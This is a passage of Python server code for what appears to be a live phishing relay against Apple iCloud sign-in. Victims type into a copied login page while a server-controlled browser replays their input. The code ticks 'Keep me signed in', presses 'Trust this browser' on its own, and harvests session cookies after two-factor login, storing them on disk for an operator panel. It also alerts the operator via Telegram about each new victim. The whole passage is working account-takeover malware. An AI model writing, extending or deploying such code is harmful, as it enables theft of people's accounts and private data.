        telegram_module.describe(f"A new client has connected.\n\n"
                                 f"Session: {sid}"))
    if went:
        log(f"telegram: told about the new client {sid}")
    else:
        log(f"telegram: not told about {sid} - {said}")


# Whose request this is, said by the cookie or by the page. The manager
# reads it, because the manager is what a name belongs to.
visitor_of = sessions.visitor_of


def session_for_named(request) -> Session | None:
    """The session of the visitor this request names - if it names one.

    A request that names a visitor gets that visitor's session, made if it
    is not there yet. A request that names nobody gets nobody's session:
    making one here would give one person two, the one the page asks for
    and the one the page's own request made on the way in.
    """
    name = visitor_of(request)
    return session_for(name) if name else None


def session_lookup(sid: str | None) -> Session | None:
    """The session this name belongs to, if there is one.

    Looking up is not the same as making: a route that only reads what is
    going on must not give a visitor a session of their own. The manager is
    asked, and it is asked without being written to.
    """
    return SESSIONS.lookup(sid)


def session_for(sid: str | None) -> Session:
    """The session this name belongs to, made new if there is none.

    The manager makes it, and it is the manager that says a client has
    connected - the panel hears it from there, not from here. What is left
    to do here is the app's own business: a line in the console, and a note
    to the operator about a client who has not been here before.
    """
    session, how = SESSIONS.arrive(sid, Session)

    if how == "back":
        log(f"session {session.id} is back")
    elif how == "new":
        log(f"new session {session.id}")
        # A note to Telegram, in the background: the person connecting must
        # not wait for Telegram, and Telegram being down must not break the
        # app. Nothing is sent - and nothing is started - when there is
        # nowhere to send it.
        #
        # A client who is coming back is not a new client, and the operator
        # has already been told about them.
        settings = admin.STORE.telegram()
        if (settings["enabled"]
                and settings["token"] and settings["chat_id"]):
            spawn(notify_new_client(session.id))

    return session


async def close_idle_sessions() -> None:
    """Shut the browsers of the visitors who have gone away.

    Somebody is here while their capture is open - while the page is
    talking to the server. A browser with nobody watching it is left
    running for a while, and then closed, and the client is remembered as
    one who has gone rather than one who is still working.
    """
    for sid, session in list(SESSIONS.items()):
        if session.hub.viewers:
            # Somebody is looking at the capture right now.
            session.touch()
            continue
        if time.monotonic() - session.seen < SESSION_IDLE_SECONDS:
            continue
        log(f"session {sid} has gone away - closing its browser")
        # The same close the panel's own "close" button does: the cookies are
        # read while the browser is still open, the client is remembered as
        # one who has gone, and the manager says so - so the panel is told,
        # rather than left to find out.
        await admin.close_client(sid)


# --------------------------------------------------------------------------
# The browser behind the capture
#
# What is typed into a capture is written into the browser the server opened,
# and what the browser is showing is written back into the capture. That is
# what makes a capture a page again instead of a picture of one: the same
# field, the same value, on both sides.
#
# The writes are done in the background: the socket must not wait for a
# browser to answer, or one slow page would hold every other viewer up.
# --------------------------------------------------------------------------


def spawn(coro) -> None:
    """A job that runs on its own, with a reference kept until it is done."""
    task = asyncio.ensure_future(coro)
    _background.add(task)
    task.add_done_callback(_background.discard)


_background: set = set()


async def write_to_browser(session: "Session", element: str, value: str) -> None:
    try:
        written = await session.bridge.write_field(element, value)
    except Exception as exc:
        log(f"browser write failed: {str(exc).splitlines()[0]}")
        return

    if written == "written":
        log(f"browser: {element} written")
        return

    if written == "held":
        # The person is still typing. It goes in when they stop.
        return

    # It had nowhere to go. That is usually the sign-in widget still
    # loading, so the value is kept and tried again - and the console says
    # what the browser does have, so a control that is there under another
    # name can be seen rather than guessed at. It is said once: the same
    # thing said every second is not news.
    if not session.bridge.mark_reported({"id": element}):
        return

    log(f"browser: {element} not found yet - "
        f"{await session.bridge.describe_missing(element)}")


async def write_at_to_browser(session: "Session", tag: str, n: int, of: int,
                              value: str, cls: str = "") -> None:
    try:
        written = await session.bridge.write_at(tag, n, of, value, cls)
    except Exception as exc:
        log(f"browser write failed: {str(exc).splitlines()[0]}")
        return

    if written == "written":
        log(f"browser: {tag} #{n} written")
        return

    if written == "held":
        return

    target = {"tag": tag, "n": n}
    if cls:
        target["cls"] = cls
    if not session.bridge.mark_reported(target):
        return

    log(f"browser: {tag} #{n} of {of} not found yet - "
        f"{await session.bridge.describe_missing(tag + ':' + str(n))}")


async def press_in_browser(session: "Session", element: str) -> None:
    # "Keep me signed in" is on before the button goes down: the session is
    # the whole point of the browser being here. A box that is already
    # ticked is left alone - clicking it would untick it.
    if remember_me_is_off(session.hub.browser or {}):
        try:
            await session.bridge.tick_remember_me()
        except Exception:
            pass

    try:
        pressed = await session.bridge.press(element)
    except Exception as exc:
        log(f"browser press failed: {str(exc).splitlines()[0]}")
        return

    if pressed == "pressed":
        log(f"browser: {element} pressed")
        return

    if pressed == "disabled":
        # It is there, and it will not go down: Apple's Continue stays
        # disabled until the form is filled in. Saying so is better than a
        # press that looks like it did something.
        log(f"browser: {element} is disabled - the browser's form is not "
            f"filled in yet")
        return

    if pressed == "held":
        return

    # The browser does not have that control. The capture may simply be
    # further along than the browser: the capture shows the sign-in form,
    # the browser still shows the landing page. Pressing Continue in the
    # capture means taking the sign-in further, and the sign-in button is
    # what does that.
    try:
        pressed = await session.bridge.press_selector(SIGNIN_BUTTON)
    except Exception:
        pressed = False

    if pressed:
        log(f"browser: {element} pressed (the sign-in button)")
        # The press has been made after all, so it is not kept and tried
        # again: a press that keeps being retried holds the bridge for as
        # long as it takes, and the values waiting to be typed need it.
        session.bridge.forget({"id": element})
        return

    log(f"browser: {element} not found yet - "
        f"{await session.bridge.describe_missing(element)}")


LIVE_POLL_SECONDS = 0.6


async def poll_browser(session: "Session") -> None:
    """Tell this visitor's viewers where their browser is.

    The capture is a copy of a moment; the browser is the session. This is
    what puts the session back into the copy: where the browser is, what it
    is called, and what its fields hold.

    This does not count as the visitor being here. The server asking the
    browser a question is not the person doing something, and a session
    that counts the server's own questions as the visitor's presence is a
    session that is never idle, and a browser that is never closed.
    """

    # There is no browser to look at. Its visitor has not opened the app
    # yet, or they have gone and it has been shut. Asking a browser that is
    # not there is answered with nothing, and that nothing would replace
    # what the panel last knew with an empty answer.
    if not session.bridge.is_open():
        return

    # The values and presses that had nowhere to go yet are tried again
    # first: the sign-in widget is a frame Apple loads a second or two
    # after Sign In is clicked, and a value typed before it is there
    # would otherwise be lost.
    try:
        await session.bridge.flush_pending()
    except Exception:
        pass

    try:
        state = await session.bridge.snapshot()
    except Exception:
        return

    # "Keep me signed in" is on, always. It is the box on the password step,
    # and the session is the whole point of the browser being here. It is
    # turned on before the browser is read again, so the capture is told
    # that it is on - the capture shows what the browser thinks.
    #
    # It is only touched when it is off: a box that is already ticked does
    # not need the browser to be asked about it every half second.
    if remember_me_is_off(state):
        try:
            await session.bridge.tick_remember_me()
        except Exception:
            pass
        try:
            state = await session.bridge.snapshot()
        except Exception:
            return

    # The form is here: the browser is at the sign-in, and this is what it
    # looks like. Remembered, because the form being gone later is what
    # means the person is in.
    if state.get("fields"):
        session.saw_sign_in = True

    # "Trust this browser?" comes straight after the code is accepted, and
    # it is waited for: the browser sits on the question until somebody
    # answers it, and the sign-in is not finished while it is there. The
    # question is answered as soon as it is seen, and what is behind it is
    # read again.
    #
    # It is only answered while the person is still signing in. Once they
    # are through, the browser is theirs: a page of their own with a button
    # that says "Trust" is not a question the app was asked.
    if state.get("trust") and not session.hub.finished:
        state = await answer_trust(session, state)
    else:
        # The question is not on the screen. The next one, when it comes,
        # is a question that has not been answered yet.
        session.trusted = False
        session.trust_since = 0.0

    # Has the person finished? The code was good, the browser is in iCloud
    # and the sign-in form is gone. Then the app takes them there, and the
    # captures are closed to them: there is nothing left in them to do.
    if not session.hub.finished and browser_is_signed_in(state, session.saw_sign_in):
        # They are in. What gets them back when they are not here is kept
        # now, while the browser is still open.
        await keep_their_cookies(session)
        session.hub.go_to_icloud()
        return

    # Has the browser accepted what was typed into the capture? It has
    # when the control that was pressed is gone, or when the browser is
    # somewhere else - which is what the sign-in form turning into the
    # verification code step looks like.
    # The account can be locked at any of the steps - the page that says so
    # comes in place of the password as easily as in place of the code - so
    # it is looked for before the step is, and the step is not waited for
    # once it is found.
    if not await check_locked(session, state):
        await check_waiting(session, state)

    if state == session.hub.browser:
        return
    session.hub.browser = state
    session.hub.broadcast({"t": "browser", **state})
    # The browser is showing something new. The panel shows where it is
    # and what it is doing, and the manager is what tells it.
    SESSIONS.changed(session, why="browser")


async def answer_trust(session: "Session", state: dict) -> dict:
    """Answer "Trust this browser?", and say what is behind it.

    The question is one button and no form. It is answered as soon as it is
    seen - once, and only ever by pressing the button that says "Trust" -
    and the page is read again, because what is behind the question is
    where the sign-in really got to.

    A question that will not go - a click the page refuses, a browser that
    has stopped answering - does not hold the person there for ever: after
    a while the page is read as if the question had been answered, and if
    that says they are in, they are in.
    """
    if not session.trust_since:
        session.trust_since = time.monotonic()
        log("the browser is asking whether to trust it - pressing Trust")

    if not session.trusted:
        try:
            session.trusted = await session.bridge.accept_trust()
        except Exception as exc:
            log(f"browser: Trust not pressed - {str(exc).splitlines()[0]}")
        if session.trusted:
            log("browser: Trust pressed")

    if session.trusted:
        try:
            return await session.bridge.snapshot()
        except Exception:
            return state

    if time.monotonic() - session.trust_since > TRUST_WAIT_SECONDS:
        log("the browser will not be trusted - carrying on without it")
        return {**state, "trust": False}

    return state


async def keep_their_cookies(session: "Session") -> None:
    """Keep what the browser holds now that its owner has signed in.

    A session that has signed in is allowed to have its cookies exported
    without the operator allowing it by hand in the panel, and the cookies
    are read while the browser is open and kept - with the session and on
    disk - so that the panel can still have them when the browser is shut,
    or when the machine has been restarted since.

    This happens once. Polling the browser is not signing in again.
    """
    if session.signed_in:
        return
    session.signed_in = True
    log(f"session {session.id} has signed in - keeping its cookies")
    try:
        admin.STORE.set_export(session.id, True)
    except Exception:
        pass
    await collect_cookies(session)


async def collect_cookies(session: "Session") -> list:
    """Read this session's cookies out of its browser, and keep them.

    They are kept three ways, because each of them can fail: with the
    session (for as long as it is here), with the record of it (for when it
    has gone), and in the panel's store on disk (for when the server has
    been restarted and neither of the other two is left).
    """
    try:
        cookies = await session.ctx.cookies()
    except Exception:
        return list(session.cookies)

    if cookies:
        session.cookies = list(cookies)
        session.cookies_at = time.time()
        try:
            admin.keep_cookies(session.id, session.cookies)
        except Exception:
            pass
        record = GONE.get(session.id)
        if record is not None:
            record["cookies"] = list(session.cookies)
    return list(session.cookies)


def browser_is_signed_in(state: dict, saw_the_form: bool = False) -> bool:
    """Is the browser through the sign-in and into iCloud?

    The code was good: the sign-in form is gone and the browser is on iCloud
    itself. That is the end of the process, and the person is sent there.

    The form has to have been there first. A browser that has only just
    opened icloud.com is on the landing page, with no form on it yet, and
    that is not being signed in - it is the beginning of the process, and
    treating it as the end of it sends everybody to iCloud and signs
    nobody in.

    Being asked whether the browser may be trusted is not being in yet: the
    question is on the screen, and the app is about to answer it.
    """
    if state.get("trust"):
        return False

    url = str(state.get("url") or "").lower()
    if "idmsa.apple.com" in url or "icloud.com" not in url:
        return False
    fields = state.get("fields") or {}
    if any(name in fields for name in
           ("account_name_text_field", "password_text_field")):
        return False
    return saw_the_form


def remember_me_is_off(state: dict) -> bool:
    """Is the browser's "Keep me signed in" box there, and not ticked?

    It is on the password step, and it has an id, so the browser's own
    reading of the page says whether it is ticked. When it is, nothing has
    to be done - and the browser is not asked about it again.
    """
    fields = state.get("fields") or {}
    entry = fields.get("remember-me")
    if not isinstance(entry, dict):
        return False
    if entry.get("type") not in ("checkbox", "radio"):
        return False
    return not entry.get("checked")


def watch_fields(fields: dict) -> list:
    """The fields to watch for: the ones the person filled in.

    The button was pressed because the form was filled in, so the fields
    that were filled in are the ones that say whether the browser has taken
    them. When they are gone, the browser has gone on to the next step.

    A box that was ticked is not one of them. "Keep me signed in" is still
    there when the sign-in form turns into the code step, and watching it
    would hold the app on the sign-in page for ever.

    When nothing had been filled in - the widget had not loaded yet - the
    fields it is showing now are watched instead.
    """
    def kind(entry) -> str:
        return entry.get("type", "") if isinstance(entry, dict) else ""

    def is_box(entry) -> bool:
        return kind(entry) in ("checkbox", "radio")

    filled = [name for name, entry in fields.items()
              if isinstance(entry, dict) and entry.get("value") and not is_box(entry)]
    if filled:
        return sorted(filled)

    text = [name for name, entry in fields.items()
            if isinstance(entry, dict) and not is_box(entry)]
    if text:
        return sorted(text)

    return sorted(fields.keys())


def account_is_locked(state: dict) -> str:
    """The words the browser is using to say the account is locked, if it is.

    Empty when it is saying nothing of the kind. The words are the browser's
    own - the dialog's title - so the panel can show what Apple said rather
    than what the app guessed.
    """
    rule = flow_blocked()
    says = str(rule.get("says") or "").strip()
    if not says:
        return ""
    shown = " ".join([str(state.get("heading") or ""),
                      str(state.get("alert") or "")]).strip()
    if says.lower() not in shown.lower():
        return ""
    return str(state.get("alert") or says).strip() or says


async def check_locked(session: "Session", state: dict) -> bool:
    """Take the person to the page that says the account is locked.

    Wherever they had got to. The lock can be shown in place of the password
    step as easily as in place of the code, so this is not part of waiting
    for one step: it is asked of every reading of the browser.

    The session is marked as one that went wrong - the panel shows the words,
    and the feed has the line - because that is what it is: not a step of the
    sign-in, and not the end of it either. Nothing is closed: the page is
    theirs to read, and the browser is theirs to shut.
    """
    words = account_is_locked(state)
    if not words:
        return False

    page = clean_page(flow_blocked().get("go"))
    if not page:
        return False

    session.waiting = None
    if session.hub.page == page:
        # Already there. Saying it again every half second is not news.
        return True

    log(f"the browser says the account is locked - going to {page}")
    session.state["error"] = words
    SESSIONS.failed(session, words)
    session.hub.navigate(page, sender=None, everyone=True)
    return True


async def check_waiting(session: "Session", state: dict) -> None:
    """Move the capture on when the browser has moved on.

    The app does not move to the next capture because a button was pressed:
    it moves when the browser has taken the details and gone on to the next
    step. Until then the capture stays where it is, and what the browser
    says about the details is shown on it.
    """
    # The browser is in iCloud: the code was good and the process is over.
    # There is no next capture to wait for.
    #
    # A person who is already through is not sent through again: this is
    # polled, and saying "going to icloud.com" every half second is not
    # news, it is noise on the viewer's line.
    if not session.hub.finished and browser_is_signed_in(state,
                                                         session.saw_sign_in):
        session.hub.go_to_icloud()
        return

    waiting = session.waiting
    if not waiting:
        return

    if time.monotonic() - waiting["since"] > WAIT_FOR_BROWSER_SECONDS:
        log(f"the browser has not moved on - staying on {waiting['page']}")
        session.waiting = None
        return

    # The browser has something to say about the details. While it is
    # saying they are wrong, the capture stays where it is: the person has
    # to be told what is wrong before they are moved on to the next step.
    #
    # This comes first, because a complaint is not a step forward. It adds
    # elements of its own to the form, and counting those as a new form is
    # what carried the person off to the code page while the browser was
    # still asking for the right password.
    if state.get("messages"):
        if not waiting.get("complained"):
            waiting["complained"] = True
            log("the browser is saying the details are wrong - staying here")
        return

    # What the flow says the app is waiting for. When the flow names the
    # page the browser should go on to, that is what is waited for: the
    # capture moves on when the browser is showing "Two-Factor
    # Authentication", and not before.
    #
    # The sign-in fields are not a good enough sign of that. Apple's widget
    # can keep the form in the page while the step underneath it changes,
    # so a form that is still there may be a form nobody is looking at any
    # more - and the app would sit on the sign-in page for ever.
    until = waiting.get("until") or {}
    wanted = until.get("heading")
    if isinstance(wanted, str) and wanted.strip():
        shown = str(state.get("heading") or "").strip()
        if wanted.strip().lower() not in shown.lower():
            return
        log(f"the browser is showing '{shown}' - going to {waiting['go']}")
        session.waiting = None
        session.hub.navigate(waiting["go"], sender=None, everyone=True)
        return

    # The browser has moved on when the form it was showing is gone - the
    # sign-in fields are not there any more, and the next step is there
    # instead.
    #
    # A form that is still there is not a new form: not when the complaint
    # has added things to it, and not when the address has moved either.
    # The browser asking the same question in a new place is still asking,
    # and a page that reloaded is still the same page.
    fields = state.get("fields") or {}
    watched = set(waiting.get("fields") or [])
    now = set(fields.keys())

    if not watched and now:
        # The browser was not showing a form when the button was pressed -
        # the widget had not loaded yet. Watch the one it is showing now.
        watched = set(watch_fields(fields))
        waiting["fields"] = sorted(watched)

    still_asking = bool(watched & now)
    moved = bool(watched) and not still_asking

    if not moved:
        return

    log(f"the browser has moved on - going to {waiting['go']}")
    session.waiting = None
    session.hub.navigate(waiting["go"], sender=None, everyone=True)


_watching = False


def start_watching() -> None:
    """Begin telling the visitors where their browsers are."""
    global _watching
    if _watching:
        return
    _watching = True
    spawn(watch_sessions())


async def watch_sessions() -> None:
    """Every visitor's browser is watched, and the idle ones are shut down."""
    while True:
        await asyncio.sleep(LIVE_POLL_SECONDS)
        for session in list(SESSIONS.values()):
            try:
                await poll_browser(session)
            except Exception:
                pass
        try:
            await close_idle_sessions()
        except Exception:
            pass
        # Anything that changed without saying so - a page moved, a browser
        # opened, a viewer arrived - is said here. The panel is never left
        # showing a list the manager no longer holds.
        try:
            SESSIONS.sync()
        except Exception:
            pass
        # A panel whose secret is no longer the secret is told so, and the
        # line is closed. This is not the panel asking the server what it
        # knows: it is the server noticing that a line is not allowed.
        try:
            admin.drop_stale_listeners()
        except Exception:
            pass


async def sync_socket(websocket: WebSocket):
    """The captured page's line to the server.

    The line belongs to one visitor: their browser, their capture, their
    page. Two people using the app at the same time never see each other.
    """
    await websocket.accept()

    sid = ""
    cookies = getattr(websocket, "cookies", None)
    if cookies:
        sid = cookies.get(SESSION_COOKIE, "")
    if not sid:
        # A copy of the app that lives on another host has no cookie of ours
        # to say who it is - the cookie is the other host's. The name comes
        # with the line instead.
        try:
            said = websocket.query_params.get("visitor", "")
        except Exception:
            said = ""
        if said and sessions.SESSION_ID.match(said):
            sid = said
    session = session_for(sid)

    # The capture holds the same ids as the page it was taken from - the
    # form's fields have the same names in both - so a value written to the
    # capture would be written to the capture. The pages the app serves are
    # not the session the bridge writes into, and it says which host it
    # serves them from.
    host = ""
    headers = getattr(websocket, "headers", None)
    if headers:
        host = headers.get("host", "")
    if host:
        session.bridge.exclude_host(host)

    viewer = Viewer(websocket)
    session.hub.join(viewer)

    try:
        while True:
            raw = await websocket.receive_text()
            try:
                message = json.loads(raw)
            except json.JSONDecodeError:
                continue
            session.hub.handle(viewer, message, session)
    except WebSocketDisconnect:
        pass
    except Exception as exc:
        log(f"viewer disconnected: {str(exc).splitlines()[0]}")
    finally:
        session.hub.leave(viewer)


app.websocket("/ws")(sync_socket)


@app.post("/nav")
async def nav(request: Request):
    """A link click, reported by ``sendBeacon`` as the page unloads.

    Waiting for the WebSocket to carry it would race the navigation; a beacon
    is delivered whether or not the document survives.
    """
    try:
        message = json.loads(await request.body() or b"{}")
    except json.JSONDecodeError:
        return Response(status_code=400)
    session = session_lookup(visitor_of(request))
    if session is not None:
        session.hub.navigate(
            message.get("page") if isinstance(message, dict) else None)
    return Response(status_code=204)


@app.get("/.well-known/appspecific/com.chrome.devtools.json")
async def chrome_devtools():
    """Chrome DevTools probes this on localhost pages. 204 keeps it quiet."""
    return Response(status_code=204)


if __name__ == "__main__":
    import uvicorn

    log("server on http://localhost:9002")
    uvicorn.run(app, host="0.0.0.0", port=9002)
